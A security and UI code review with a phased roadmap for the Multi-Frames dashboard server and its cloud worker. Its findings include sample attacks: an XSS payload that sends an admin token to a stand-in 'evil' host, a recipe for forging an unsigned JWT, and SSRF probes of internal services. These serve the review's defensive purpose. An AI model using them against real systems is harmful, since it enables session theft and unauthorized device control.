# Multi-Frames — Review Findings & Roadmap

**Date:** 2026-07-07
**Scope reviewed:** `multi_frames.py` (~12,700 lines), `cloud/worker.js` (~4,255 lines), the modular `multi_frames/` package.
**Baseline:** builds on [REVIEW.md](REVIEW.md) (2026-04-16) and [TODO.md](TODO.md); this pass focuses on **new** UI and network bugs and a forward-looking roadmap. All 50 tests in `tests/run_tests.py` pass.

This document has two halves:

1. **Bugs found** — verified defects grouped by severity, with `file:line` and a concrete failure scenario for each.
2. **Roadmap** — what to add and improve, sequenced.

Line numbers are as of commit `f134412`.

---

## Part 1 — Bugs found

### Legend
- 🔴 **Critical** — remotely exploitable or data-destroying.
- 🟠 **High** — security gap or a whole feature broken.
- 🟡 **Medium** — wrong behavior a user will hit.
- ⚪ **Low** — cosmetic, edge-case, or defense-in-depth.

---

### 1.1 Cloud Worker (`cloud/worker.js`)

#### 🔴 C-1 — `verifyToken` never checks the signature at all
`cloud/worker.js:45-55`. The function destructures `signature` out of the token but only decodes the `payload`, checks `exp`, and checks `hd`. It never recomputes or compares the signature. This is strictly worse than the "cosmetic base64 signature" logged in REVIEW.md §1.2 — there is no comparison whatsoever.
**Failure:** an unauthenticated attacker forges full admin access with `header.` + `btoa(JSON.stringify({email:'x@allowed.com',hd:'allowed.com',exp:9999999999}))` + `.anything`. Every `verifyAuth`-gated route — config push to any device, firmware deploy, tunnel initiate/proxy — is fully bypassable.
**Fix:** HMAC-SHA256 with `crypto.subtle.sign`/`verify`; reject on mismatch. This is the single highest-priority item in the codebase.

#### 🟠 C-2 — Stored XSS from device fields into the admin portal
`cloud/worker.js:3386-3388` (also 3377, 3410, 3459, 3732, 3887). `renderDeviceCard` interpolates `device.hostname`, `device.ip_address`, `device.version`, and `device.name` directly into `innerHTML` with no escaping. Those fields are written verbatim from the device heartbeat body (`worker.js:526-528`). No `escapeHtml` helper exists anywhere in the portal JS.
**Failure:** a compromised/malicious device sends `version: "<img src=x onerror=fetch('//evil/'+localStorage.mf_token)>"` in a heartbeat; it executes in the admin's browser on the Devices page and exfiltrates the admin session token from `localStorage`. `device.name` is also injected into `onclick="initiateTunnel('${device.name}')"` (l.3410), so a `'` breaks the handler.
**Fix:** add an `escapeHtml` helper and use it for every device-controlled field; prefer `textContent`/attribute APIs over `innerHTML`.

#### 🟠 C-3 — Tunnel endpoints authorize "any valid session," not tunnel ownership
`cloud/worker.js:1179, 1208, 1357-1364, 1404-1405`. Tunnel status, close, `admin-ws`, and the HTTP proxy check only `verifyToken`/`verifyAuth` (any authenticated Workspace user). None verify that the caller initiated that tunnel or is bound to `session.device_id`.
**Failure:** any authenticated user who learns or guesses a `tunnelId` (16 lowercase-alnum chars) can open `/api/tunnel/proxy/<id>/` and drive the target device's local webserver, attach `admin-ws` and inject raw messages forwarded to the device, or close another admin's tunnel. Combined with C-1 this is remote device control by an unauthenticated attacker.
**Fix:** bind each tunnel to its initiating user; check ownership on every tunnel route.

#### 🟡 C-4 — Device WebSocket `device_key` check is optional
`cloud/worker.js:1324-1331`. The device WS handler validates `tunnel_token`, then verifies `device_key` **only if it is present** (`if (deviceKey) {...}`). Omitting the query param skips device-identity verification entirely.
**Failure:** anyone holding just the 48-char `tunnel_token` can connect as the "device" end of the relay without proving they are the device.
**Fix:** hard-require `device_key`; reject when absent.

#### 🟡 C-5 — Read-modify-write races on shared KV arrays
`worker.js` widget-template create/PUT/DELETE (835-876), push-to-devices version bump (908-919), `device_list` on registration (504-506), per-device `config:{id}` version bump (635-710), `tunnel_log_index` (4237-4241). Each does get → mutate array → put with no compare-and-swap; KV has no transactions.
**Failure:** two concurrent template creates both read the same array; the second `put` silently overwrites the first. Two concurrent config pushes to one device both compute `version = N+1`; one write is lost while both report success.
**Fix:** move mutable collections behind a Durable Object, or add optimistic version guards.

#### 🟡 C-6 — Metrics running-average divides by the wrong denominator
`cloud/worker.js:980, 989, 999, 1007`. `summary.data_points` is incremented once per record and then reused as the divisor for the incremental means of `cpu_temp`, `memory_pct`, and `cpu_usage`. When a metric is null in some samples (e.g. a non-Pi device reports `cpu_temp: null`), the formula `(avg*(data_points-1)+val)/data_points` counts the null samples in the denominator and skews 7d/30d chart values low.
**Fix:** keep a separate non-null counter per metric.

#### 🟡 C-7 — OAuth callback has no `state`/CSRF parameter
`cloud/worker.js:369-419`. The auth-URL builder sets no `state` and the callback validates none. Login-CSRF vector; no nonce/`id_token` validation either.
**Fix:** add a signed `state` round-trip.

#### ⚪ C-8 — Proxy auth cookie stores the full admin JWT
`cloud/worker.js:1424-1427`. The subresource cookie `tunnel_token_<id>` stores the admin's entire session JWT with `Max-Age=3600`. It is `HttpOnly` (so JS can't read it — good), but a captured proxy request replays as full admin for an hour.
**Fix:** mint a per-tunnel opaque capability token instead of reusing the session JWT.

#### ⚪ C-9 — `Math.random()` for security credentials
`cloud/worker.js:40, 117, 126`. `generateDeviceKey`, `generateTunnelToken`, `generateTunnelId` use `Math.random()`. `crypto.randomUUID()` is already used elsewhere, so a CSPRNG is available.
**Fix:** use `crypto.getRandomValues`.

#### ⚪ C-10 — Unprotected `request.json()` (still open from REVIEW §2.6); CORS `*` (§1.3); token in redirect query string + `localStorage` (§3.4); metrics `splice` truncation (§3.5)
Still present. Note two REVIEW items **were fixed** and can be closed: missing `await logTunnelEvent` (§2.5) and the widget-template route-order collision (§2.7). 90-day tunnel-log retention is correctly enforced (TTL on `tunnel_log:*`, index capped at 500).

---

### 1.2 Python server — network (`multi_frames.py`)

#### 🟠 N-1 — `/api/send-command` has no host restriction (authenticated SSRF)
`multi_frames.py:10585-10635`, `send_network_command()` at `3256-3380`. Any logged-in user (not just admin) can POST `{protocol, host, port, command}` and the server opens a TCP/UDP/Telnet connection to any host and port — no `validate_local_ip`, no allow-list.
**Failure:** a non-admin sends TCP to `10.0.0.5:6379` (internal Redis) and reads the banner from `result['response']`, or probes `169.254.169.254` for cloud metadata.
**Fix:** restrict targets to `validate_local_ip` (or an admin-managed allow-list) and gate the endpoint to admins if that matches intent.

#### 🟠 N-2 — Socket FD leak in `send_network_command` on every failed command
`multi_frames.py:3292-3365`. Sockets are created but `sock.close()` is only on the success path. When `connect()`, `sendto`, or `sendall` raises (timeout, refused, DNS error) the socket is never closed. Applies to UDP (3294), TCP (3303), and the raw-socket telnet fallback (3343).
**Failure:** a kiosk polling a downed device leaks one FD per attempt; eventually the process hits `EMFILE` and stops accepting connections.
**Fix:** wrap each socket in `try/finally: sock.close()`.

#### 🟡 N-3 — SSRF via proxy redirect (still open, REVIEW §1.1) + HTTPS redirect breaks
`multi_frames.py:10398-10422`. The redirect loop still does not re-validate the host with `validate_local_ip`, and additionally the reconnect always uses `http.client.HTTPConnection` on port 80 by default, ignoring `redir_parsed.scheme` — so any cross-host `https://` redirect connects plaintext to the wrong port and fails.
**Fix:** re-run `validate_local_ip` on each redirect target, reject protocol-relative `Location`, and honor the scheme (`HTTPSConnection` + port 443).

#### 🟡 N-4 — Tunnel picks its session user by a field that doesn't exist
`multi_frames.py:1223-1224`. The loop matches `udata.get('role') == 'admin'`, but user records store `is_admin` (bool) — there is no `role` key anywhere. The admin match never succeeds, so the tunnel always falls through to `next(iter(users))`, the first user in dict order, which may be a non-admin. A remote operator reaching the device through the cloud tunnel then gets that arbitrary account's privileges (and a non-admin session can't reach `/admin`).
**Fix:** match `udata.get('is_admin')`.

#### 🟡 N-5 — Proxy `conn` leaked on any upstream exception
`multi_frames.py:10370-10461`. `conn` is created inside the `try`; the only `conn.close()` is on the success path. If `getresponse()`, `resp.read()`, or the redirect loop raises, the `except` at 10459 returns 502 but never closes `conn`.
**Fix:** `try/finally` around the connection lifecycle.

#### ⚪ N-6 — Soundtrack authorization gap + racy cache + blocking calls
`multi_frames.py:10291-10328, 10685-10723` (any logged-in user can drive play/pause/skip/volume against an arbitrary `zone` string via the admin token, not just their permitted widgets); `_soundtrack_cache` at 3109 is a lock-free dict with check-then-set (concurrent polls all miss and each make a 10s-blocking upstream call, defeating the 8s TTL and tying up one thread each).
**Fix:** scope control to zones the user can see; guard the cache with a lock; consider a shorter upstream timeout.

#### ⚪ N-7 — Cloud CPU metric is a since-boot average, not current load
`multi_frames.py:1159-1166`. `usage = 1 - idle/total` uses cumulative `/proc/stat` counters, so `cpu_usage` barely moves.
**Fix:** sample twice and report the delta.

#### ⚪ N-8 — Unverified-SSL firmware path
`multi_frames.py:838-851`. `_get_ssl_context()` falls back to an unverified context when no CA bundle is found, and `_apply_firmware()` runs over that path — a MITM on a misconfigured host could feed arbitrary code.
**Fix:** require verification for firmware download, or pin the cloud cert.

> Note: the REVIEW.md "X-Forwarded-For spoofs the rate limit" concern is **not** actually exploitable — login throttling keys on `self.client_address[0]` (the socket peer), not the header. The spoofable header only feeds the informational `/api/client-info`. That item can be downgraded.

---

### 1.3 Python server — UI (`multi_frames.py`)

#### 🟠 U-1 — Proxy index mismatch with per-user permissions (wrong content, bypasses allow-list)
`multi_frames.py:6166/6302` vs `10352-10357`. `render_main_page` enumerates the **filtered** iframe list and emits `src="proxy/{i}"`, but the `/proxy/` handler indexes the **unfiltered** `config["iframes"]`.
**Failure:** config has iframes A, B; a non-admin is allowed only B. B renders at filtered index 0, so its frame loads `proxy/0` → the server proxies **A's** URL — an iframe the allow-list explicitly hides. CLAUDE.md's own rule ("never store list indices") is violated by the proxy URL.
**Fix:** address the proxy target by the stable iframe `id`, not list position.

#### 🟠 U-2 — Fallback-image feature is entirely dead code
`multi_frames.py:6083-6086, 6309`. Settings (7496-7521) and the POST handler (11214) store `fallback_image`, and `render_main_page` computes `fallback_enabled/text/image/mime` — but nothing uses them. The per-frame `<div id="fallback-{i}">` divs are empty and no JS references `fallback-`.
**Failure:** an admin uploads a fallback image, enables it, an iframe fails to load — nothing ever appears.
**Fix:** wire an iframe `onerror`/load-timeout to reveal the fallback div, or remove the advertised feature.

#### 🟡 U-3 — `.status-dot` and its state classes are never defined
No stylesheet defines `.status-dot`/`.connected`/`.loading`/`.error` (only `.status.online/.offline` exist at 3977-3978). Consequences: help-page test dots (5240, 5262) have no red/green color even though Quick Tips explains "Red/Green status"; the mDNS "Active" indicator (8658) is an empty, invisible span; firmware/restore "spinner" divs (12039, 12124, 12242, 12285, 12347) render as nothing.
**Fix:** define the missing classes (and a spinner keyframe).

#### 🟡 U-4 — "Status Icon" iframe setting does nothing
`multi_frames.py:6174`. `show_status` is in the add form (7127), edit form (6691-6694), and persisted (10739, 10847), and `render_main_page` reads it into a variable that is never used.
**Fix:** implement the status icon, or drop the setting.

#### 🟡 U-5 — Requests/Errors log tabs show the oldest entries, hiding the newest
`multi_frames.py:9296` (`reversed(recent_requests[:30])`) and `9327` (`reversed(recent_errors[:20])`). The getters return chronological lists, so `[:30]` takes the **oldest** 30 of the last 50. The logs tab correctly uses `[-50:]`.
**Failure:** an admin refreshes the Requests tab after activity and the latest requests never appear.
**Fix:** slice `[-30:]` / `[-20:]`.

#### 🟡 U-6 — Notes widget never renders line breaks
`multi_frames.py:5927`: `escape_html(content).replace('\\n', '<br>')` replaces the literal two-character string `\n`, not newline characters. Textareas post real newlines, so multi-line notes collapse to one run-on line.
**Fix:** replace `'\n'` (real newline), or use `white-space: pre-wrap`.

#### 🟡 U-7 — Embed-code iframes can't be edited without faking a URL
`multi_frames.py:6648` (edit) and 7116 (add): `<input type="url" name="url" ... required>`. Embed-code iframes store `url=""`, so browser validation blocks the submit even though the server ignores `url` when `use_embed_code=1`. The embed toggles never clear `required` on the URL field.
**Failure:** editing an existing embed iframe to change its height is impossible without typing a dummy URL.
**Fix:** drop `required` (or clear it) when embed mode is active.

#### 🟡 U-8 — Unescaped quotes break inline JS handlers and widget scripts
Same root cause as the known `escape_html` single-quote gap, but with concrete live breakages:
- Weather widget `5806`: `var locationInput = '{location_escaped}';` — a real city like **"St. John's"** throws a `SyntaxError` and kills the widget; `&` also becomes `&amp;` in the geocoding call.
- Countdown widget `5746`: `new Date('{target}')` — same pattern.
- System panel test button `9762`: `onclick="testUrl({i},'{url_escaped}','{name}')"` — `name` gets no JS-quote escaping, so an iframe named **"Bob's Camera"** breaks its Test button. The `&#39;` trick used for URLs doesn't help inside `onclick` because the HTML parser decodes it back to `'` before JS runs.
**Fix:** add a real JS-string escaper (or emit values via `JSON.stringify`-equivalent) for all inline handler/script interpolation, and fix `escape_html` to cover `'`.

#### ⚪ U-9 — Soundtrack "Test Connection" tests the saved token, not the one in the box
`multi_frames.py:7582-7589`. The button fetches `/api/soundtrack/zones`, which uses the saved config token, so pasting a new token and clicking Test before Save validates the old token.
**Fix:** send the input value with the test request.

#### ⚪ U-10 — Soundtrack zone dropdown built from unescaped API strings
`multi_frames.py:7929-7933`. `opts += '<option value="' + z.id + '">' + label + '</option>'` then `innerHTML = opts` — a zone/account name with `"` or `<` corrupts the dropdown.
**Fix:** escape or build option elements via the DOM API.

#### ⚪ U-11 — Minor UI defects
- "No buttons added yet" placeholder never shows in the **edit** builder — `:empty` doesn't match the whitespace text nodes around `{buttons_editor_html}` (7748-7750, 7784).
- Stale `localStorage.adminTab` blanks the whole admin panel — `switchTab` hides everything then dereferences a missing panel with no null check (7051-7072).
- Config-export "Copy" throws over plain HTTP — `navigator.clipboard` is undefined outside secure contexts (9971); no fallback, no feedback.
- Blank dashboard when 0 iframes and only disabled widgets — the empty-state check uses raw lists (6088) but disabled widgets are skipped at render (6075).
- **Doc mismatch:** CLAUDE.md advertises "drag-and-drop reordering," but only ▲/▼ move buttons exist — there is no drag code anywhere.

#### Carried over from REVIEW.md (still present, still worth doing)
`escape_html` doesn't escape `'` (3387); help page builds HTML via `innerHTML` string concat (5268, 5367, 5535, 5682); `sendCommand` JS duplicated verbatim (6099, 6343).

---

## Part 2 — Roadmap

Sequenced so that each phase is shippable on its own. Effort is rough: **S** ≤ half a day, **M** ≈ 1–2 days, **L** ≈ a week.

### Phase 0 — Stop the bleeding (security, ship first) — ✅ DONE (v1.5.0)
The cloud tunnel path allowed unauthenticated admin-equivalent access; this is now closed.

| Item | Refs | Effort | Status |
|------|------|--------|--------|
| HMAC-verify the worker JWT signature | C-1 | S | ✅ |
| Escape device-controlled fields in the portal | C-2 | S | ✅ |
| Bind tunnel routes to their initiating user; require `device_key` | C-3, C-4 | M | ✅ |
| Restrict `/api/send-command` to local hosts | N-1 | S | ✅ |
| Add OAuth `state`; use CSPRNG for keys/tokens | C-7, C-9 | S | ✅ |
| Close the socket + proxy-conn leaks (`try/finally`) | N-2, N-5 | S | ✅ |
| Fix tunnel admin-user selection (`is_admin`) | N-4 | S | ✅ (pulled forward) |

### Phase 1 — Correctness bugs users hit — ✅ DONE (v1.5.1)
| Item | Refs | Effort | Status |
|------|------|--------|--------|
| Address proxy by stable iframe `id`, not index | U-1 | M | ✅ |
| Wire up the fallback-image feature | U-2 | M | ✅ |
| Fix Requests/Errors tabs to show newest entries | U-5 | S | ✅ |
| Fix notes line breaks; embed-code `required`; status-dot CSS | U-6, U-7, U-3 | S | ✅ |
| Real JS-string escaping for inline handlers; finish `escape_html(')` | U-8 | M | ✅ |
| Fix tunnel admin-user selection (`is_admin`) | N-4 | S | ✅ (done in Phase 0) |
| Honor scheme + re-validate host on proxy redirects | N-3 | S | ✅ |
| Correct the metrics running-average denominator + CPU delta | C-6, N-7 | S | ✅ |

Remaining low-severity UI items (deferred, not blocking): buttons-editor `:empty` placeholder (U-11), stale `localStorage.adminTab` null-guard, clipboard-copy fallback over plain HTTP, blank-dashboard empty-state when only disabled widgets exist.

### Phase 2 — Hardening & correctness from the standing backlog — ✅ mostly DONE (v1.6.0)
- ✅ PBKDF2 password hashing with per-hash salt + on-login migration (legacy SHA-256 still verifies).
- ✅ Thread-safety: locks around `sessions`, `failed_login_attempts`, `_soundtrack_cache`, and config writes; atomic `save_config` via temp-file + `os.replace`.
- ✅ Background sweeper for expired sessions / failed-login entries.
- ✅ Security response headers + `Content-Security-Policy`; `HttpOnly`/`SameSite=Strict` cookies (+ `Secure` behind TLS); `0600` config file; server-side session invalidation on logout.
- ✅ CSRF defense: `SameSite=Strict` cookie + `Origin`/`Referer` check on state-changing POSTs (chosen over per-form tokens — less breakage, complements SameSite; tunnel-forwarded requests exempt).
- ✅ `readJson` helper applied to all 13 worker `request.json()` sites (C-10).
- ⏳ **Deferred — KV read-modify-write guards / Durable Object (C-5).** KV has no CAS; a correct fix needs a Durable Object or per-key template storage. Not shipping a racy half-guard.
- ⏳ Not yet done: per-tunnel capability tokens instead of reusing the session JWT (C-8); narrowing the Python `except: pass` sites (low severity, tracked for a cleanup pass).

Full read-modify-write atomicity of the server `config` across concurrent handlers (load→modify→save under one lock) is **not** yet in place — only the write itself is atomic. Serializing whole handler cycles is a larger refactor deferred alongside the Phase 3 in-memory config cache.

### Phase 3 — Performance — ✅ mostly DONE (v1.6.1)
- ✅ In-memory config cache keyed on file `(mtime, size)`, returning deep copies; cache refreshed on `save_config`.
- ✅ Cached generated CSS (invalidated when `appearance` settings change).
- ✅ gzip for HTML/JSON responses > 1 KB with `Vary: Accept-Encoding`.
- ✅ Serve logo/favicon/icons/background from `/static/<name>` with `Cache-Control` + `ETag`/304 and versioned URLs. (Moving the base64 images *out of the config JSON* entirely remains a Phase 4 item — this release stops re-embedding them into every response.)
- ⏳ Not yet done: proxy connection reuse; shorter/configurable Soundtrack upstream timeout (low impact — deferred).

### Phase 4 — New features & platform — ✅ selected items DONE (v1.7.0)
- ✅ **Deleted the dead modular package.** `python -m multi_frames` was non-runnable scaffolding; removed so the single file is the honest source of truth. (Chose delete over finishing the refactor.)
- ✅ **Audit logging to disk** with size rotation, opt-in via `MF_AUDIT_LOG` (login/user-mgmt/command/tunnel/server events as JSONL).
- ✅ **Config schema versioning + migration runner** (`schema_version` + `_migrate_config`); ID backfill and image externalization are now migrations.
- ✅ **Moved branding images out of the config JSON** into `multi_frames_assets/` (migration v2), with a legacy base64 fallback.
- ✅ **Health/readiness endpoint** (`/healthz`, `/api/health`).
- ⏹️ **Drag-and-drop reordering** — deliberately NOT added; ▲/▼ move buttons kept (product decision). Docs corrected in v1.5.1.
- ⏳ Not done (future): SSE real-time widget updates; widget marketplace/template library; Prometheus-style metrics.

### Phase 5 — Mobile / PWA — ✅ DONE (v1.8.0)
Decision: stay on the vanilla single-file stack — **no Next.js / npm / build step**
(a framework would break the Pi/kiosk deploy model; the cloud portal already
proved PWA is the right pattern). All in `render_page` head + two new routes +
CSS, no new dependencies.
- ✅ **Installable PWA**: `/manifest.webmanifest` + `theme-color` + `mobile-web-app-capable` + `viewport-fit=cover` + icon wiring.
- ✅ **Offline service worker** (`/sw.js`), auth-safe (cache-first only for hashed `/static`; network-first navigations; never caches `/api`/`/proxy`/auth).
- ✅ **Light/dark theme toggle** (device-default + manual, no-FOUC pre-paint, widgets follow theme).
- ✅ **Launch splash / loading screen** (once per session / standalone).
- ✅ **Responsive fixes**: iframe height cap (`--frame-h`/75vh), full-width frames, landscape ≤2 widget cols, 44px touch targets, styled range/volume sliders (live), scrollable admin tables, URL ellipsis, safe-area fullscreen button.
- ✅ **Cleanup**: wired the orphaned iframe-gap/content-padding settings; removed dead CSS; fixed the file-backed image-background regression.
- Verified with a headless Playwright pass at 375×812 (no horizontal overflow, height cap, theme persistence, SW registration, landscape columns) + the stdlib suite (77 tests).
- ⏳ Not done (future): `apple-touch-startup-image` per device size; push notifications; a settings toggle to force a theme fleet-wide.

### Testing to add alongside
- Regression tests for U-1 (permission-filtered proxy index), N-1 (send-command host restriction), N-4 (tunnel admin selection), C-1 (worker signature verification), U-5 (log tab ordering), U-6 (notes newlines).
- A worker unit harness (currently only `node --check` + route parity) covering `verifyToken`, tunnel ownership, and the metrics averaging math.

---

### Suggested first PR
Phase 0 as one focused security PR (C-1, C-2, C-3, C-4, N-1, N-2), since those are the remotely reachable ones and several are one-line fixes. Everything else can follow in themed PRs per phase.
